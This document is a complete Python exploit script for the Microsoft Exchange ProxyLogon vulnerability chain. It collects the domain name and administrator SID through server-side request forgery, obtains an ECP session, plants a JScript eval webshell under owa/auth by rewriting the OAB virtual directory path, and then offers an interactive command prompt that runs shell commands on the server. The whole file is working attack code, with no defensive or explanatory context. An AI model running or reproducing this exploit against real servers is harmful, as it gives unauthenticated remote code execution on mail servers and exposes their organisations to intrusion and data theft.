import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import base64
import re
import time
from struct import unpack

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

if len(sys.argv) < 2:
    print()
    print("--------------------------------------------------------------------------------")
    print("|                                                                                |")
    print("|  Usage: python {} <target> <email>                                             ".format(sys.argv[0]))
    print("|  Usage: python {} mail.exchange.cn administrator@exchange.cn                   ".format(sys.argv[0]))
    print("|                                                                                |")
    print("--------------------------------------------------------------------------------")
    print()
    exit()

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


# 随机获取到名称
def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


random_name = id_generator(4) + ".js"

target = sys.argv[1]
email = sys.argv[2]
LOCAL_NAME = ''
DOMAIN = ''
COMPUTER = ''

random_str = ''.join(random.sample(string.ascii_letters + string.digits, 20))
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 " \
             "Safari/537.36 "

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\" + random_str + ".aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

# webshell
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],' \
                '"unsafe");}</script> '

# webshell exec
'''
code=Response.Write(
    new ActiveXObject("WScript.Shell")
    .exec("whoami")
    .StdOut.ReadAll()
    );
'''


# 解析NTLM
def _unpack_str(byte_string):
    return byte_string.decode('UTF-8').replace('\x00', '')


def _unpack_int(format, data):
    return unpack(format, data)[0]


def parse_challenge(auth):
    target_info_field = auth[40:48]
    target_info_len = _unpack_int('H', target_info_field[0:2])
    target_info_offset = _unpack_int('I', target_info_field[4:8])
    target_info_bytes = auth[target_info_offset:target_info_offset + target_info_len]
    domain_name = ''
    computer_name = ''
    info_offset = 0
    while info_offset < len(target_info_bytes):
        av_id = _unpack_int('H', target_info_bytes[info_offset:info_offset + 2])
        av_len = _unpack_int('H', target_info_bytes[info_offset + 2:info_offset + 4])
        av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len]

        info_offset = info_offset + 4 + av_len
        if av_id == 2:  # MsvAvDnsDomainName
            domain_name = _unpack_str(av_value)
        elif av_id == 3:  # MsvAvDnsComputerName
            computer_name = _unpack_str(av_value)

    assert domain_name, 'DomainName not found'
    assert computer_name, 'ComputerName not found'

    return domain_name, computer_name


def get_ComputerName():
    print('\n[*] Getting ComputerName and DomainName')

    '''
    ntlm_type1 = (
            'NTLMSSP\x00'  # NTLMSSp Signature
            '\x01\x00\x00\x00'  # Message Type
            '\x97\x82\x08\xe2'  # Flags
            '\x00\x00\x00\x00\x00\x00\x00\x00'  # Domain String
            '\x00\x00\x00\x00\x00\x00\x00\x00'  # Workstation String
            '\x0a\x00\xba\x47\x00\x00\x00\x0f'  # OS Version
        )
    '''

    # NTLM 请求通过在 headers 中添加一个 Authorization:Negotiate 字段
    headers = {
        'Authorization': 'Negotiate {}'.format('TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKALpHAAAADw==')
    }
    # 请求rpc 获取NTLM 认证
    # nmap也有一个可以通过rpc来获取exchange信息的
    # nmap MAIL  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
    r = requests.get('https://%s/rpc/' % target, headers=headers, verify=False, proxies=proxies)
    auth_header = r.headers['WWW-Authenticate']
    auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
    domain_name, computer_name = parse_challenge(base64.b64decode(auth))
    print("[+] domain : ", domain_name)
    print(" |")
    print("[+] computer : ", computer_name)
    return computer_name, domain_name


# 获取sid
def get_sid(mail):
    global target, LOCAL_NAME
    payload = '''
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>%s</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    ''' % mail
    ssrf_xml = requests.post(
        "https://{}/ecp/{}".format(target, random_name),
        headers={
            "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % LOCAL_NAME,
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
        },
        data=payload,
        proxies=proxies,
        verify=False
    )
    if ssrf_xml.status_code != 200:
        print()
        print("[-] Autodiscover Error! status_code is %s \n" % ssrf_xml.status_code)
        exit()

    if "<ErrorCode>500</ErrorCode>" in ssrf_xml.text:
        print("[-]  Invalid E-Mail-Adresse ! or E-Mail-Adresse : email@domain \n")
        exit()
    elif "<LegacyDN>" not in str(ssrf_xml.content):
        print("[-] Can not get LegacyDN!")
        exit()

    legacyDn = str(ssrf_xml.content).split("<LegacyDN>")[1].split(r"</LegacyDN>")[0]
    print(" |")
    print("[*] Getting LegacyDN")
    print("[+] LegacyDN : " + legacyDn)

    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5"
                  "@exchange.lab&a=~1942062522;" % LOCAL_NAME,
        "Content-Type": "application/mapi-http",
        "X-Requesttype": "Connect",
        "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
        "X-Clientapplication": "Outlook/15.0.4815.1002",
        "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
        "User-Agent": user_agent
    },
                       data=mapi_body,
                       verify=False,
                       proxies=proxies,
                       )
    if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
        print("[-] Mapi Error!")
        exit()
    sid = str(ct.content).split("with SID ")[1].split(" and MasterAccountSid")[0]

    print(" |")
    print("[*] Getting SID")
    print("[+] SID : " + sid)
    return sid


def proxyLogon(sid):
    proxyLogon_data = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" 
    t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s 
    a="3221225479" t="1">S-1-5-5-0-6948923</s></r> 
    """ % sid
    proxyLogon_res = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % LOCAL_NAME,
        "Content-Type": "text/xml",
        "msExchLogonMailbox": "S-1-5-20",
        "User-Agent": user_agent
    },
                                   verify=False,
                                   proxies=proxies,
                                   data=proxyLogon_data,
                                   )
    if proxyLogon_res.status_code != 241 or not "set-cookie" in proxyLogon_res.headers:
        print("[-] Proxylogon Error!")
        exit()
    sess_id = proxyLogon_res.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

    msExchEcpCanary = proxyLogon_res.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
    print(" |")
    print("[*] Getting session")
    print("[+] session : " + sess_id)
    print(" |")
    print("[*] Getting msExchEcpCanary")
    print("[+] msExchEcpCanary : " + msExchEcpCanary)

    ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory"
                  "&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                      LOCAL_NAME, msExchEcpCanary, sess_id, msExchEcpCanary),
        "Content-Type": "application/json; ",
        "msExchLogonMailbox": "S-1-5-20",
        "User-Agent": user_agent

    },
                       json={"filter": {
                           "Parameters": {
                               "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                       verify=False, proxies=proxies
                       )

    if ct.status_code != 200:
        print("[-] GetOAB Error!")
        exit()
    elif "RawIdentity" not in ct.text:
        print("[-] Get OAB Error!")
        exit()

    oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
    print(" |")
    print("[*]Got OAB id")
    print("[+] OAB : " + oabId)

    oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                "properties": {
                    "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                   "ExternalUrl": "http://ffff/#%s" % shell_content}}}

    ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            LOCAL_NAME, msExchEcpCanary, sess_id, msExchEcpCanary),
        "msExchLogonMailbox": "S-1-5-20",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent
    },
                       json=oab_json,
                       verify=False, proxies=proxies
                       )
    if ct.status_code != 200:
        print("Set external url Error!")
        exit()

    reset_oab_body = {
        "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
        "properties": {
            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                           "FilePathName": shell_absolute_path}}}

    ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            LOCAL_NAME, msExchEcpCanary, sess_id, msExchEcpCanary),
        "msExchLogonMailbox": "S-1-5-20",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent
    },
                       json=reset_oab_body,
                       verify=False, proxies=proxies
                       )

    if ct.status_code != 200:
        print("[-] Got shell failure ! ")
        exit()

    print(" |")
    print("[*]upload shell success")
    print("POST  shell:https://" + target + "/owa/auth/" + random_str + ".aspx")
    print(" |")
    print("[+] request shell now")
    shell_url = "https://" + target + "/owa/auth/" + random_str + ".aspx"
    time.sleep(10)
    # print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')

    # data = requests.post(shell_url, data={
    #     "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},
    #                      verify=False, proxies=proxies)
    post_data = {"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"}
    data = requests.get(shell_url, verify=False, proxies=proxies)
    if data.status_code != 200:
        print("[-] request shell failure ")
        exit()
    elif "<div class=\"errorHeader\">404</div>" in data.text:
        print("[-] request shell failure , 404 shell ! ")
        exit()
    elif "OAB (Default Web Site)" in data.text:
        print("\n |")
        print("[*]Got shell success")
        print(" |")

    data = requests.get(shell_url, verify=False, data=post_data, proxies=proxies)
    if data.status_code == 500:
        print("[-] exec error !\n")
    elif data.status_code != 200:
        print("[-] request shell failure ")
    elif "<div class=\"errorHeader\">404</div>" in data.text:
        print("[-] request shell failure , 404 shell ! ")
    else:
        print("[+] 权限如下：" + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",
                                                                                 ""))
        print(" |")
        print("[+] input exit or quit to exit !")
        while True:

            cmd = input("PS C:\> ")

            if cmd == "exit" or cmd == "quit" or cmd == "q":
                exit()
            elif cmd == "":
                print("command null ! ")
            else:
                data = requests.post(shell_url, data={
                    "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"{}\").StdOut.ReadAll());".format(
                        cmd)},
                                     verify=False, proxies=proxies)
                if data.status_code == 500:
                    print("[-] exec error ! ")
                elif "errorFooter" in data.text:
                    print("[-] exec error ! ")
                else:
                    print(data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",
                                                                               ""))


if __name__ == '__main__':
    LOCAL_NAME, DOMAIN = get_ComputerName()
    sid = get_sid(email)
    proxyLogon(sid)
